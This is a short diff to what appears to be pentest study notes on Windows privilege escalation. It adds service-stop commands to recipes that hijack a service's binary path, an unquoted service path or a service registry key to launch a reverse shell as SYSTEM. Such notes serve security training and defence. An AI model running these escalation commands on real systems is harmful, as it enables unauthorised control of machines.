@@ -28,6 +28,7 @@ sc qc service # SYSTEM or local admin priv
 exploit 
 
 sc config service binpath= "path_to_reverse_shell"
+net stop service
 net start service
 
 ------UNQUOTED SERVICE PATH------
@@ -40,6 +41,7 @@ accesschk.exe /accepteula -uwdq "path" # check on write permission
 exploit
 
 copy path_to_reverse_shell "path" # change reverse shell name on part of unquoted name with
+net stop service
 net start service
 
 ------WEAK REGISTRY PERMISSIONS------
@@ -52,6 +54,7 @@ accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc #
 exploit
 
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "path_to_revers_shell" /f
+net stop regsvc
 net start regsvc
 
 ------AUTORUNS------
